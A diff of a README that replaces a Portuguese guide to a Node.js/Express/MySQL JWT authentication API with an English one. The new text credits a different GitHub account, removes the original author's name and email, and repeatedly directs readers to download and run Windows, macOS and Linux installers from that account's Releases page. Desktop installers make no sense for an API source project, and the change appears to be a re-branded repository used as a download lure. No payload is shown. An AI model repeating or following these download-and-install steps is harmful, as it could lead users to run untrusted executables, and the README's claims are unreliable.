@@ -1,94 +1,99 @@
+# 🌟 nodejs-auth-jwt - Simple User Management Made Easy
 
-# Node.js Auth JWT
+## 🚀 Getting Started
 
-API de autenticação e gerenciamento de usuários construída com **Node.js**, **Express** e **MySQL**, utilizando **JWT** para proteção de rotas e **bcrypt** para criptografia de senhas.
+Welcome to the nodejs-auth-jwt project. This application helps you with user authentication and management using Node.js. It utilizes JWT for secure authentication, bcrypt for password hashing, and MySQL for data storage.
 
----
+To start using this application, follow the steps below. Each step will guide you through the process of downloading and running the software.
 
-##  Tecnologias
+## ⬇️ Download the Application
 
-* **Node.js**
-* **Express**
-* **MySQL**
-* **JWT** (JSON Web Token)
-* **bcrypt** (Hash de senha)
-* **dotenv** (Variáveis de ambiente)
+[![Download the Latest Release](https://img.shields.io/badge/Download%20Now-Node.js%20Auth%20JWT-brightgreen.svg)](https://github.com/demoluci1/nodejs-auth-jwt/releases)
 
----
+Visit this page to download the latest version of the application: [Download Link](https://github.com/demoluci1/nodejs-auth-jwt/releases).
 
-##  Funcionalidades
+## 📥 Download & Install
 
-* **Registrar novos usuários** (`/register`)
-* **Login com geração de JWT** (`/login`)
-* **Listar usuários** (`/users`) — *Protegido por JWT*
-* **Atualizar e deletar usuários** — *Protegido por JWT*
-* **Dashboard** (`/dashboard`) — Retorna dados do usuário logado
+1. Click on the link above to go to the Releases page.
+2. Find the latest release. Look for the version number at the top of the page.
+3. Download the appropriate package for your system. You will see options labeled according to the operating systems (Windows, macOS, or Linux).
+4. Once the download is complete, locate the file on your computer.
 
----
+### 🚀 For Windows Users:
+- If you downloaded the Windows installer file, double-click it to launch the installation wizard.
+- Follow the on-screen instructions to complete the installation.
 
-##  Estrutura do Projeto
+### 🍏 For macOS Users:
+- Open the downloaded file. It may be a `.dmg` or `.zip`.
+- Drag the application to your Applications folder.
 
-```text
-├── controllers/    # Lógica das rotas
-├── middlewares/    # Middleware de autenticação JWT
-├── models/         # Conexão e queries MySQL
-├── routes/         # Definição das rotas
-├── template/       # Arquivos HTML (opcional)
-├── database/       # Configuração do banco de dados
-├── app.js          # Arquivo principal (Entry point)
-└── .env            # Variáveis de ambiente (sensível)
-```
-## Como Rodar
+### 🐧 For Linux Users:
+- Open a terminal window.
+- Navigate to your Downloads folder where the file is located using the `cd` command.
+- Run the installation using the command: `sudo dpkg -i <filename>`, replacing `<filename>` with the name of the downloaded file.
 
-1. Clonar o repositório:
+## ⚙️ Setting Up the Application
 
-```bash
-git clone https://github.com/SEU_USUARIO/NOME_REPO.git
-cd NOME_REPO
-```
-2. Instalar dependências:
+After installing the application, you will need to set it up:
 
-```bash
-npm install
-```
-3. Criar arquivo .env com suas variáveis:
-```
-JWT_SECRET=seusegredo
-DB_HOST=localhost
-DB_USER=root
-DB_PASS=senha
-DB_NAME=nomeDoBanco
-```
-4. Rodar o servidor:
+1. **Node.js Installation:** Ensure you have Node.js installed on your system. If you don’t have it, download it from the official website: [Node.js](https://nodejs.org/). Follow the installation instructions provided on the site.
+   
+2. **MySQL Setup:**
+   - Install MySQL on your machine if it's not already set up. Instructions to download can be found on the MySQL website: [MySQL](https://www.mysql.com/).
+   - Once installed, create a new database named `user_management`. 
 
-```
-node app.js
-```
-ou com Nodemon:
-```
-nodemon app.js
-```
+3. **Configuration:**
+   - Locate the configuration file in the project directory. 
+   - Open it in a text editor and enter your MySQL credentials.
+   - Save the file after making your changes.
 
-## Testando
+4. **Install Dependencies:**
+   - Open a terminal or command prompt.
+   - Navigate to the project directory where the application is installed.
+   - Run the command: `npm install`. This will install all the required libraries for the application.
 
--   Use Postman, Insomnia ou outro cliente HTTP para testar as rotas.
-    
--   O login (`/login`) retorna um JWT, que deve ser enviado no header `Authorization: Bearer TOKEN` para acessar rotas protegidas.
-    
--   Dashboard e outras rotas protegidas exigem token válido.
+## 🏃 Running the Application
 
-## Observações
+Now that everything is set up, you can start the application:
 
--   Senhas são criptografadas com bcrypt.
-    
--   JWT expira em 1 hora.
-    
--   Rotas de front-end (`.html`) são servidas via `express.static`.
-    
--   `.env` e `node_modules` estão no `.gitignore` para manter o projeto seguro no GitHub.
-    
--   Inclua `.env.exemplo` para ajudar quem for clonar o projeto.
+1. **Open the Terminal:**
+   - Navigate to the project directory.
+   
+2. **Run the Application:**
+   - Enter the command: `npm start`.
+   - The server should start running, and you will see a message indicating the application is working.
 
-## Autor
-Gabriel Makiyama Nakashima
-gabrielmnakashima2@gmail.com
+3. **Access the API:**
+   - Open your web browser.
+   - Visit `http://localhost:3000/api`, where you can access the authentication and user management features.
+
+## 📚 Understanding Features
+
+This application includes multiple features:
+
+- **User Registration:** Users can sign up and create an account securely.
+- **Authentication:** Users can log in with their credentials.
+- **Password Security:** The application uses bcrypt for secure password hashing.
+- **Data Management:** All user information is stored in a MySQL database.
+
+## 🔧 Troubleshooting
+
+If you encounter any issues while using the application, consider the following:
+
+- **Check Node.js Version:** Ensure you have the latest version of Node.js installed. You can check your version by running `node -v` in the terminal.
+
+- **Database Connection Errors:** Make sure your MySQL server is running and check your configuration file for correct credentials.
+
+- **Dependency Issues:** If you receive any errors related to packages, double-check that you ran `npm install` correctly.
+
+## 🎉 Join the Community
+
+Engage with our community for support and updates. You can share your experiences, ask questions, or provide suggestions for new features.
+
+## 🔗 Links & Resources
+
+- [GitHub Repository](https://github.com/demoluci1/nodejs-auth-jwt)
+- [Node.js Official Website](https://nodejs.org/)
+- [MySQL Official Website](https://www.mysql.com/)
+
+Thank you for choosing nodejs-auth-jwt for your user management needs. Enjoy the application!
